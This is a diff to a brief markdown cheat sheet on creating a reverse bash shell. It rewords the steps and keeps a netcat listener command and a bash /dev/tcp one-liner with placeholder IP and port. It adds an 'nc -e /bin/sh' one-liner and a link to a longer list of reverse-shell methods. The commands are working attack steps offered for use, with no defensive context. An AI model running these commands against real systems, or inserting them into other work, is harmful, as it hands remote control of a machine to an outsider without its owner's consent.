@@ -1,10 +1,12 @@
 ### Create a reverse bash shell
 
-1. Setup listener on your local machine
+- Setup listener on your local machine
 `sudo nc -lvn 9898`
 
-2. Connect to the listener from the target
-`bash -c 'bash -i >& /dev/tcp/your-ip/your-port 0>&1'`
+- Connect to the listener from the target
+-  - `bash -c 'bash -i >& /dev/tcp/your-ip/your-port 0>&1'`
+-  - `nc 127.0.0.1 8888 -e /bin/sh`
+
 
 ### A long list of ways to create a reverse shell
 https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux
